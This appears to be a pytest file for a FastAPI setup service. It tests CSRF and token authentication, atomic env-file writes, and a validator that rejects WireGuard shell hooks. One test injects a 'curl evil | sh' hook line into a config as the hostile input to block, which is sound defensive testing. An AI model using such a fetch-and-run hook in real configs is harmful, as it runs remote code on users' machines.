"""Auth (CSRF, token compare, URL-token redirect), WG hook rejection and
atomic env-file writes. No docker daemon needed."""

import os
import sys

import pytest

os.environ.setdefault("SETUP_AUTH_TOKEN", "test-token-fixture")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

pytest.importorskip("fastapi")
pytest.importorskip("httpx")

import main  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

TOKEN = main._expected_token()
VALID_WG = """[Interface]
PrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
Address    = 10.2.0.2/32

[Peer]
PublicKey  = WGPubKeyExample0000000000000000000000000000=
AllowedIPs = 0.0.0.0/0
Endpoint   = vpn.example.com:51820
"""


@pytest.fixture
def client():
    return TestClient(main.app, base_url="http://testserver")


@pytest.mark.parametrize("hook", ["PostUp", "PreUp", "PostDown", "PreDown", "postup"])
def test_wg_config_rejects_shell_hooks(hook):
    conf = VALID_WG.replace("[Peer]", f"{hook} = curl evil | sh\n\n[Peer]")
    errors = main._validate_wg_config(conf)
    assert any("disallowed key" in e for e in errors)


def test_wg_config_allows_comments_and_known_keys():
    conf = "# provider comment\n" + VALID_WG + "PersistentKeepalive = 25\n"
    assert main._validate_wg_config(conf) == []


def test_url_token_redirects_and_sets_cookie(client):
    r = client.get(f"/?token={TOKEN}", follow_redirects=False)
    assert r.status_code == 303
    assert r.headers["location"] == "/"
    assert main.SESSION_COOKIE in r.cookies


def test_non_ascii_token_is_401_not_500(client):
    assert client.get("/api/state", headers={"Authorization": "Bearer é".encode()}).status_code == 401
    assert client.get("/?token=%C3%A9").status_code == 401
    assert client.post("/auth", data={"token": "é"}).status_code == 401


def test_cookie_post_requires_same_origin(client):
    client.cookies.set(main.SESSION_COOKIE, TOKEN)
    # Cross-origin (e.g. the dashboard on :8080) — rejected before any write.
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "http://testserver:8080"})
    assert r.status_code == 401
    # No Origin/Referer at all — rejected.
    r = client.post("/api/tunnel/1", data={"conf": "x"})
    assert r.status_code == 401
    # Same origin — passes auth, then fails validation on the bogus config.
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "http://testserver"})
    assert r.status_code == 400


def test_bearer_header_post_needs_no_origin(client):
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 400


def test_update_env_is_atomic_and_private(tmp_path, monkeypatch):
    env = tmp_path / "env"
    env.write_text("# comment\nSETUP_AUTH_TOKEN=abc\nTELEGRAM_API_ID=\n")
    monkeypatch.setattr(main, "ENV_FILE", env)
    main._update_env({"TELEGRAM_API_ID": "123456", "NEW_VAR": "x"})
    assert env.read_text() == (
        "# comment\nSETUP_AUTH_TOKEN=abc\nTELEGRAM_API_ID=123456\nNEW_VAR=x\n"
    )
    assert oct(env.stat().st_mode & 0o777) == "0o600"
    assert not (tmp_path / "env.tmp").exists()
